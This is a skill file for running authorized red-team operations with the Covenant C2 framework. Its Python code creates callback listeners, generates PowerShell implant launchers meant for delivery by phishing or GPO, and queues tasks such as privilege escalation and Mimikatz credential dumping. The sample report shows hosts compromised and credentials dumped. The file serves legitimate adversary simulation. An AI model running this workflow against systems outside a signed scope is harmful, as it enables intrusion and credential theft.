---
name: performing-red-team-with-covenant
description: Conduct red team operations using the Covenant C2 framework for authorized adversary simulation, including listener
  setup, grunt deployment, task execution, and lateral movement tracking.
domain: cybersecurity
subdomain: red-team
tags:
- red-team
- c2
- covenant
- adversary-simulation
- penetration-testing
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- ID.RA-01
- GV.OV-02
- DE.AE-07
---
# Performing Red Team Operations with Covenant C2

## Overview

Covenant is a collaborative .NET C2 framework for red teamers that provides a Swagger-documented REST API for managing listeners, launchers, grunts (agents), and tasks. This skill covers automating Covenant operations through its API for authorized red team engagements: creating HTTP/HTTPS listeners, generating binary and PowerShell launchers, deploying grunts, executing tasks on compromised hosts, and tracking lateral movement.


## When to Use

- When executing an authorized red team engagement that requires a collaborative C2 platform with multiple operators
- When automating repetitive C2 tasks (listener setup, launcher generation, task scheduling) via the Covenant REST API
- When documenting adversary simulation activities with structured task logs for the engagement report
- When validating defensive controls by simulating specific MITRE ATT&CK techniques using Covenant's built-in task library

**Do not use** without written authorization from the system owner. Covenant deploys persistent agents on target systems — unauthorized use is illegal and unethical.

## Prerequisites

- Covenant C2 server deployed (Docker: `docker run -it -p 7443:7443 cobbr/covenant` or .NET 6 native build)
- Python 3.9+ with `requests` library (`pip install requests`)
- Covenant API token obtained from `/api/users/login`
- Written authorization for the red team engagement (Rules of Engagement signed)
- Isolated lab environment or authorized target scope clearly defined

## Workflow

### Step 1: Authenticate and Obtain an API Token

```python
import requests
import json
import time

COVENANT_BASE = "https://localhost:7443"  # Replace with your Covenant instance
VERIFY_SSL = False  # Set True if using a valid cert

def get_covenant_token(username: str, password: str) -> str:
    """Authenticate to Covenant and return a JWT bearer token."""
    resp = requests.post(
        f"{COVENANT_BASE}/api/users/login",
        json={"UserName": username, "Password": password},
        verify=VERIFY_SSL,
    )
    resp.raise_for_status()
    token = resp.json().get("covenantToken")
    if not token:
        raise RuntimeError(f"Login failed: {resp.text}")
    print(f"Authenticated as {username}")
    return token

token = get_covenant_token("Admin", "CovenantPassword1!")
auth_headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
```

### Step 2: Create an HTTP Listener

```python
def create_http_listener(
    name: str,
    bind_port: int = 80,
    callback_url: str = "http://192.168.1.10",
) -> int:
    """Create an HTTP listener and return its ID."""
    payload = {
        "name": name,
        "description": "Red team HTTP listener",
        "bindAddress": "0.0.0.0",
        "bindPort": bind_port,
        "connectAddresses": [callback_url.rstrip("/")],
        "connectPort": bind_port,
        "useSSL": False,
        "httpRequestResponse": [
            {
                "verb": "GET",
                "uris": ["/index.html", "/jquery.js"],
                "headers": [{"name": "User-Agent", "value": "*"}],
                "bodyFormat": "",
                "httpRequestBody": "",
                "httpResponseHeaders": [{"name": "Content-Type", "value": "text/html"}],
                "httpResponseBody": "ok",
            }
        ],
    }
    resp = requests.post(
        f"{COVENANT_BASE}/api/listeners/http",
        headers=auth_headers,
        json=payload,
        verify=VERIFY_SSL,
    )
    resp.raise_for_status()
    listener_id = resp.json()["id"]
    print(f"Listener '{name}' created: ID {listener_id}")
    return listener_id

listener_id = create_http_listener("TeamListener", bind_port=80, callback_url="http://10.10.10.5")
```

### Step 3: Generate a Launcher

```python
def generate_powershell_launcher(listener_id: int, implant_template_id: int = 2) -> str:
    """Generate a PowerShell launcher for the given listener."""
    payload = {
        "listenerId": listener_id,
        "implantTemplateId": implant_template_id,  # 2 = GruntHTTP
        "dotNetVersion": "Net40",
        "delay": 5,
        "jitterPercent": 10,
        "connectAttempts": 5000,
        "killDate": "2099-01-01T00:00:00",
    }
    resp = requests.post(
        f"{COVENANT_BASE}/api/launchers/powershell",
        headers=auth_headers,
        json=payload,
        verify=VERIFY_SSL,
    )
    resp.raise_for_status()
    launcher_code = resp.json().get("launcherString", "")
    print(f"PowerShell launcher generated ({len(launcher_code)} chars)")
    return launcher_code

launcher = generate_powershell_launcher(listener_id)
# Deploy launcher to target via phishing, GPO, or initial access vector
print(launcher[:100] + "...")
```

### Step 4: Monitor Grunt Callbacks and Execute Tasks

```python
def wait_for_grunt(expected_hostname: str, timeout_seconds: int = 300) -> dict:
    """Poll for a new grunt callback from the expected host."""
    deadline = time.time() + timeout_seconds
    seen_ids: set[int] = set()
    while time.time() < deadline:
        resp = requests.get(f"{COVENANT_BASE}/api/grunts", headers=auth_headers, verify=VERIFY_SSL)
        resp.raise_for_status()
        for grunt in resp.json():
            if grunt["id"] not in seen_ids and grunt.get("status") == "Active":
                if expected_hostname.lower() in grunt.get("hostname", "").lower():
                    print(f"Grunt connected: ID {grunt['id']} from {grunt['hostname']}")
                    return grunt
            seen_ids.add(grunt.get("id"))
        time.sleep(10)
    raise TimeoutError(f"No grunt from {expected_hostname} within {timeout_seconds}s")

def execute_task(grunt_id: int, task_name: str, parameters: dict | None = None) -> dict:
    """Execute a Covenant task on a grunt and return the task record."""
    payload = {"taskName": task_name, "parameters": parameters or {}}
    resp = requests.post(
        f"{COVENANT_BASE}/api/grunts/{grunt_id}/tasks",
        headers=auth_headers,
        json=payload,
        verify=VERIFY_SSL,
    )
    resp.raise_for_status()
    task = resp.json()
    print(f"Task '{task_name}' queued on grunt {grunt_id}: task ID {task['id']}")
    return task

grunt = wait_for_grunt("WORKSTATION01")
whoami_task = execute_task(grunt["id"], "WhoAmI")
sysinfo_task = execute_task(grunt["id"], "GetSystem")  # Attempt privilege escalation
```

### Step 5: Collect Task Output and Generate Operations Report

```python
def get_task_output(grunt_id: int, task_id: int, poll_timeout: int = 120) -> str:
    """Poll for task output until completed."""
    deadline = time.time() + poll_timeout
    while time.time() < deadline:
        resp = requests.get(
            f"{COVENANT_BASE}/api/grunts/{grunt_id}/tasks/{task_id}",
            headers=auth_headers,
            verify=VERIFY_SSL,
        )
        resp.raise_for_status()
        task = resp.json()
        if task.get("status") == "Completed":
            return task.get("gruntsTaskingOutput", "")
        time.sleep(5)
    return "(timeout waiting for output)"

whoami_output = get_task_output(grunt["id"], whoami_task["id"])

from datetime import datetime, timezone

report = {
    "engagement": "Authorized Red Team — Acme Corp Q4 2025",
    "generated_at": datetime.now(timezone.utc).isoformat(),
    "listeners": [{"id": listener_id, "type": "HTTP", "port": 80}],
    "grunts": [
        {
            "id": grunt["id"],
            "hostname": grunt.get("hostname"),
            "username": grunt.get("userName"),
            "integrity": grunt.get("integrity"),
            "os": grunt.get("operatingSystem"),
        }
    ],
    "tasks_executed": [
        {"task": "WhoAmI", "output": whoami_output},
    ],
}

with open("covenant_engagement_report.json", "w") as f:
    json.dump(report, f, indent=2)

print(json.dumps(report, indent=2))
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| **Grunt** | Covenant agent deployed on a compromised host; communicates back to a listener at configured intervals (delay + jitter) |
| **Listener** | Covenant server-side component that receives grunt callbacks; supports HTTP, HTTPS, and bridge profiles |
| **Launcher** | Artifact delivered to a target to deploy a grunt — available as PowerShell, Binary, MSBuild, InstallUtil, and others |
| **Implant template** | Base grunt binary template; `GruntHTTP` and `GruntSMB` are the two default templates |
| **Task** | Covenant action sent to a grunt — maps closely to MITRE ATT&CK techniques (WhoAmI → T1033, GetSystem → T1548, etc.) |
| **Delay + Jitter** | C2 callback timing controls; delay is base sleep interval (seconds), jitter adds ±% randomness to evade periodic-beacon detection |
| **Rules of Engagement (RoE)** | Signed document defining authorized scope, timeline, and allowed techniques; required before any red team deployment |

## Tools & Systems

- **Covenant**: Open-source .NET C2 framework with REST API, web UI, and collaborative multi-operator support
- **Python requests**: HTTP client for scripting Covenant API interactions
- **Covenant Swagger UI**: Interactive API documentation at `https://<covenant-host>/swagger`; useful for exploring available endpoints
- **Cobalt Strike**: Commercial alternative to Covenant with a similar listener/beacon/task model; Covenant's API design is inspired by it

## Common Scenarios

### Scenario: Automating Multi-Host Listener Setup for a Large Engagement

**Context**: A red team engagement covers 200+ workstations. Rather than configuring listeners and launchers manually in the Covenant web UI, automate the setup to save time and reduce configuration errors.

**Approach**:
1. Use `create_http_listener` to create separate listeners for each target segment (e.g., one per VLAN with appropriate callback IPs)
2. Generate launchers for each listener and store them as files
3. Deploy launchers via the authorized initial access vector (GPO script, phishing attachment)
4. Use `wait_for_grunt` in a polling loop to log each callback as it arrives
5. Assign grunts to operators via the Covenant team server UI

**Pitfalls**:
- Covenant's default SSL certificate is self-signed; `VERIFY_SSL = False` is acceptable in lab environments but never in production — use a valid cert or pin the expected fingerprint
- The `killDate` field in launchers should be set to the engagement end date; expired grunts will stop calling back without cleanup

### Scenario: Documenting MITRE ATT&CK Coverage for an Adversary Simulation

**Context**: The engagement requires mapping each executed task to a MITRE ATT&CK technique for the purple team report.

**Approach**:
1. Use `GET /api/tasks` to enumerate all available Covenant tasks and their `mitre` metadata
2. Execute one task per ATT&CK technique being tested (e.g., T1003 with `Mimikatz`, T1055 with `ShellCode`)
3. Collect task output via `get_task_output`
4. Build a coverage matrix mapping technique ID → task name → execution result (success/fail) → defender detection (yes/no)

**Pitfalls**:
- Some Covenant tasks require elevated privileges (SYSTEM or high integrity); check grunt `integrity` field before queuing tasks that need elevation
- Task output may contain base64-encoded data from PowerShell launchers; decode before including in the report

## Output Format

```
COVENANT RED TEAM ENGAGEMENT REPORT
======================================
Engagement:     Authorized Red Team — Acme Corp Q4 2025
Generated:      2025-10-30T16:00:00Z

LISTENERS
ID   Type    Port   Status
12   HTTP    80     Active

GRUNT INVENTORY
ID   Hostname        User                    Integrity   OS
8    WORKSTATION01   ACME\jsmith             High        Windows 10 21H2
9    DC01            NT AUTHORITY\SYSTEM     System      Windows Server 2019

TASKS EXECUTED
Grunt  Task              Output (truncated)
8      WhoAmI            ACME\jsmith
8      GetSystem         [+] Elevated to SYSTEM via Token Impersonation
8      Mimikatz          [*] Dumped 3 credential pairs
9      SharpHound        [+] BloodHound data collected (1,842 nodes)

MITRE ATT&CK COVERAGE
T1033   System Owner/User Discovery     WhoAmI          Executed
T1548   Abuse Elevation Control Mech    GetSystem       Executed
T1003   OS Credential Dumping           Mimikatz        Executed
T1069   Permission Groups Discovery     SharpHound      Executed

Report saved to: covenant_engagement_report.json
```
